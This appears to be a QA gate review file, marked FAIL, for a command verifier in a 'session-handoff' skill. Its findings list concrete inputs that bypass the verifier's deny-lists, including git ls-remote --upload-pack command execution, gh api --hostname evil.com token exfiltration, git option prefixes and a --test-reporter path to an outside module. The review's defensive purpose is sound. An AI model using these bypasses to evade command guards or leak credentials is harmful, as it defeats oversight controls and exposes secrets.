@@ -1,0 +1,166 @@
+schema: 1
+task: 'task.110.session-handoff-skill'
+task_title: 'A session-handoff skill that writes the handoff and re-measures it on read'
+gate: FAIL
+status_reason: 'Cycle-1 fixes verified (bug.1–3 closed: every shape gate 1 named is refused, corpus 0/73 hostile accepted, group kill proved). The refute pass and a fresh 170-input re-probe found the DENY-LIST mechanism itself is the defect: git accepts long-option prefixes and exec-shaped options (ls-remote --upload-pack), remote/branch -v bypass the early return, npm honours --check on any script, gh api --hostname exfiltrates the token, npx --write=. joined form. Replace the deny-lists with per-binary allow-lists.'
+reviewer: 'QA Engineer'
+updated: '2026-09-15T03:13:01Z'
+
+top_issues:
+  - id: 'CR-1'
+    severity: high
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'git ls-remote is admitted with no flag check, so git ls-remote --upload-pack=<cmd> . (or -u <cmd>) makes git execute the named local command — reproduced by the reviewer.'
+    suggested_action: 'Allow-list the flags each git subcommand may carry; refuse --upload-pack/-u/--exec/--ext-diff/--textconv.'
+    suggested_owner: dev
+    status: open
+  - id: 'CR-2'
+    severity: high
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'gitRule returns true when the first remote arg is -v/--verbose without reading further, so git remote -v add evil <url>, git remote -v set-url …, git remote --verbose remove origin are allowed.'
+    suggested_action: 'Do not early-return on a decorating flag; validate the whole argv against an allow-list.'
+    suggested_owner: dev
+    status: open
+  - id: 'CR-3'
+    severity: high
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'rest.includes("--check") accepts --check anywhere, so npm run format --check runs this repo format = prettier --write . and npm run bundle --check runs the bundler; any script becomes runnable by appending --check (also found by the QA re-probe: npm run generate-catalog -- --check regenerates the catalog — generate_catalog.py has no --check).'
+    suggested_action: 'Honour --check only for bundle, and only as npm run bundle -- --check exactly; otherwise the script name alone decides.'
+    suggested_owner: dev
+    status: open
+  - id: 'CR-4'
+    severity: high
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'GIT_LISTING_FLAG treats -v/-vv as selecting list mode, but git branch -v newname creates a branch and git branch -v --del foo deletes one (confirmed against git).'
+    suggested_action: 'Allow git branch/tag only with an explicit allow-list of flags and no positional unless --list/--contains/--merged/--points-at is present.'
+    suggested_owner: dev
+    status: open
+  - id: 'CR-5'
+    severity: high
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'git parse-options accepts unambiguous long-option prefixes, so exact-match deny-lists miss --del, --forc, --mov, --edit-desc, --unset-upstrea, --set-upstream-t=origin/main (confirmed: the last reaches upstream setup).'
+    suggested_action: 'Deny-lists cannot enumerate prefixes — replace them with allow-lists (unknown flag ⇒ refused).'
+    suggested_owner: dev
+    status: open
+  - id: 'PRB-2'
+    severity: high
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'gh api --hostname evil.com repos/x is admitted (read-shaping flag list), which sends the stored gh token to an arbitrary host.'
+    suggested_action: 'Remove --hostname from the gh api allow-list.'
+    suggested_owner: dev
+    status: open
+  - id: 'PRB-3'
+    severity: high
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'npx prettier --write=. is admitted — NPX_WRITE_FLAG matches --write exactly, not its joined form.'
+    suggested_action: 'Allow-list per tool with (=.*)? on every entry; an unknown flag is refused.'
+    suggested_owner: dev
+    status: open
+  - id: 'CR-6'
+    severity: medium
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'npxRule admits tools whose default or common invocations write: npx tsc emits .js unless noEmit; eslint/stylelint/markdownlint -o/--output-file; jest --coverage/--outputFile; eslint --cache.'
+    suggested_action: 'Per-tool allow-lists of read-only flags (tsc requires --noEmit).'
+    suggested_owner: dev
+    status: open
+  - id: 'CR-7'
+    severity: medium
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'detached: true puts the child in its own session, so Ctrl-C on the verifier no longer reaches the child, and spawnSync blocks the event loop so no handler can kill the group — an interrupted verifier orphans npm test.'
+    suggested_action: 'Async spawn with SIGINT/SIGTERM handlers that kill the group before re-raising.'
+    suggested_owner: dev
+    status: open
+  - id: 'CR-8'
+    severity: medium
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'NPM_READ_ONLY_SCRIPT trusts any lint:*, validate:*, test:*, eval:* suffix, so lint:fix, validate:fix, test:update-snapshots are whitelisted by name (also found by the QA re-probe: npm run lint:fix).'
+    suggested_action: 'Enumerate the exact script names this repo treats as read-only, or refuse suffixes containing fix/write/update.'
+    suggested_owner: dev
+    status: open
+  - id: 'CR-9'
+    severity: medium
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'date sets the clock from a bare positional on BSD and GNU (date 0101120026), and only -s/--set is refused.'
+    suggested_action: 'Allow date only with +format and read flags; refuse positionals not starting with +.'
+    suggested_owner: dev
+    status: open
+  - id: 'CR-10'
+    severity: low
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'The empty-figure filter is applied on table rows but not on the comment path, so **—** <!-- cmd: … --> reports stale: moved: — every run.'
+    suggested_action: 'Apply the same normalise-non-empty filter to boldSpans(prose).'
+    suggested_owner: dev
+    status: open
+  - id: 'CR-11'
+    severity: low
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: '--test-reporter=<module> is a safe flag but its value is a module node loads and executes, so --test-reporter=../../evil.mjs runs code from outside the cwd.'
+    suggested_action: 'Restrict --test-reporter= to the built-in names.'
+    suggested_owner: dev
+    status: open
+  - id: 'CR-12'
+    severity: low
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'SHELL_OPERATOR runs on the raw string before tokenising, so a quoted | inside a jq filter or grep -E pattern is refused as shell operator.'
+    suggested_action: 'Check operators per token after tokenize(), where quotes are already honoured.'
+    suggested_owner: dev
+    status: open
+  - id: 'CR-13'
+    severity: low
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'Arguments after the script are still tested against the inline-flag regex, so node scripts/x.mjs --check is refused although --check belongs to the script.'
+    suggested_action: 'Stop checking node flags once the script positional has been seen.'
+    suggested_owner: dev
+    status: open
+
+waiver:
+  active: false
+
+quality_score: 0
+
+evidence:
+  tests_reviewed: 23
+  phases_verified: '4/4'
+  trace:
+    phases_covered: [1, 2, 3, 4]
+    phases_with_issues: [2]
+
+nfr_validation:
+  security:
+    status: FAIL
+    evidence: measured
+    probes_executed: 296
+    notes: 'QA re-probe: 73 corpus cases across all 5 sinks (0 hostile accepted) + 170 fresh spellings (4 accepted that should not be: gh api --hostname, npx --write=., npm run lint:fix, npm run generate-catalog -- --check); reviewer refute pass: 53 probes executed against git/npm/gh, 5 HIGH confirmed by running the real binaries in non-mutating forms. Cycle-1 fixes hold (bug.1–3 verified closed); the mechanism — deny-lists over binaries whose CLIs accept prefixes and joined forms — is what fails.'
+  performance:
+    status: PASS
+    notes: 'Unchanged.'
+  reliability:
+    status: CONCERNS
+    notes: 'CR-7: detached child survives Ctrl-C on the verifier (the group kill only fires on timeout). CR-12 refuses legitimate quoted jq/grep patterns.'
+  maintainability:
+    status: CONCERNS
+    notes: 'Two cycles of deny-list patching on one file; the third-strike rule is one cycle away. CR-14: -o refusal too broad (git ls-files -o).'
+
+recommendations:
+  immediate:
+    - action: 'Replace every deny-list with a per-binary ALLOW-list: for each binary an explicit set of permitted flags (exact and =value forms), a positional policy, and refusal of everything else — prefixes, joined forms and exec-shaped options are then refused by construction. This is a mechanism replacement, not a third patch.'
+      refs: ['skills/session-handoff/scripts/handoff-verify.mjs']
+    - action: 'Async runner: kill the process group on SIGINT/SIGTERM as well as on timeout.'
+      refs: ['skills/session-handoff/scripts/handoff-verify.mjs']
+    - action: 'Add the cycle-2 shapes (prefixes, -v bypass, --check on any script, --hostname, --write=., ls-remote --upload-pack, date positional, npx -o/--coverage) to the refused list; add an ALLOW-list property test: every accepted argv contains only allow-listed flags.'
+      refs: ['skills/session-handoff/tests/handoff-verify.test.js']
+  future:
+    - action: 'CR-10, CR-11, CR-12, CR-13, CR-14.'
+      refs: ['skills/session-handoff/scripts/handoff-verify.mjs']
+
+bug_resolution:
+  bugs_fixed: 3
+  bugs_remaining: 0
+  fix_date: '2026-09-15'
+  total_iterations: 1
+  verification_method: 'Every gate-1 shape re-probed (refused); corpus 0/73 hostile accepted; group-kill test; 3 mutation proofs re-run by QA (covered)'
+
+deployment_readiness:
+  staging: BLOCKED
+  production: BLOCKED
+  conditions: ['Allow-list mechanism in place; refute pass on cycle 3 finds no HIGH']
